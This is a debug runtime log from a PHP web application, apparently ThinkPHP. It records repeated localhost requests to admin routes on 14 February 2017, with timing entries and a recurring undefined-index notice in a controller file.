INFO: [ view_parse ] --END-- [ RunTime:0.022001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:18:11+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:18:12+08:00 ] 127.0.0.1 /shi.php/Home/Index/txset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.009001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.009001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.001000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:18:12+08:00 ] 127.0.0.1 /shi.php/Home/Common/getTree
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.002000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.002000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:33+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:34+08:00 ] 127.0.0.1 /shi.php/Home/Index/txset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.007001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.007001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:34+08:00 ] 127.0.0.1 /shi.php/Home/Common/getTree
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000000s ]
INFO: [ app_end ] --END-- [ RunTime:0.000000s ]

[ 2017-02-14T17:18:35+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010001s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010001s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:35+08:00 ] 127.0.0.1 /shi.php/Home/Index/txset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.006000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.006000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

[ 2017-02-14T17:18:36+08:00 ] 127.0.0.1 /shi.php/Home/Common/getTree
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.000000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.002000s ]
INFO: [ app_end ] --END-- [ RunTime:0.002000s ]

[ 2017-02-14T17:18:44+08:00 ] 127.0.0.1 /shi.php/Home/Index/jjset
INFO: [ app_begin ] --START--
INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ app_begin ] --END-- [ RunTime:0.001000s ]
NOTIC: [8] Undefined index: all D:\www\huzhu\mingyingtianxia\snadmin\Home\Controller\CommonController.class.php ç¬¬ 15 è¡Œ.
INFO: [ view_parse ] --START--
INFO: [ template_filter ] --START--
INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000000s ]
INFO: [ template_filter ] --END-- [ RunTime:0.000000s ]
INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.010000s ]
INFO: [ view_parse ] --END-- [ RunTime:0.010000s ]
INFO: [ view_filter ] --START--
INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000000s ]
INFO: [ view_filter ] --END-- [ RunTime:0.000000s ]
INFO: [ app_end ] --START--
INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001000s ]
INFO: [ app_end ] --END-- [ RunTime:0.001000s ]

